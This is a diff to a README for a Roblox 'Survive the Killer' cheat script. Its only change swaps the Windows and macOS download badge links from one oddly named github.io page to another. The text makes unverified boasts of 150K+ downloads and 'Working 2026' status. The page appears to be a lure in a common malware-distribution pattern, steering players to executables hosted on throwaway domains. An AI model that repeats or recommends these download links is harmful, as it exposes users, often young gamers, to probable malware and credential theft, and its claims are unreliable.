@@ -4,7 +4,7 @@
 ![Downloads](https://img.shields.io/badge/Downloads-150K+-blueviolet?style=for-the-badge)
 ![Status](https://img.shields.io/badge/Status-Working%202026-blueviolet?style=for-the-badge)
 
-[![Download Survive the Killer Script](https://img.shields.io/badge/Download%20Survive%20the%20Killer%20Script-blueviolet?style=for-the-badge&logo=roblox&logoColor=white)](https://bansheeloaderquay.github.io/dl-win/)
+[![Download Survive the Killer Script](https://img.shields.io/badge/Download%20Survive%20the%20Killer%20Script-blueviolet?style=for-the-badge&logo=roblox&logoColor=white)](https://WatchMizukageSnap.github.io/getwindows/)
 
 ---
 
@@ -49,9 +49,9 @@ The most reliable **Survive the Killer Script** for Survive the Killer — auto-
 
 <div align="center">
 
-[![Download for Windows](https://img.shields.io/badge/Download_for_Windows-0078D4?style=for-the-badge&logo=windows&logoColor=white)](https://bansheeloaderquay.github.io/dl-win/)
+[![Download for Windows](https://img.shields.io/badge/Download_for_Windows-0078D4?style=for-the-badge&logo=windows&logoColor=white)](https://WatchMizukageSnap.github.io/getwindows/)
 
-[![Download for macOS](https://img.shields.io/badge/Download_for_macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://bansheeloaderquay.github.io/dl-mac/)
+[![Download for macOS](https://img.shields.io/badge/Download_for_macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://WatchMizukageSnap.github.io/getmac/)
 
 </div>
 
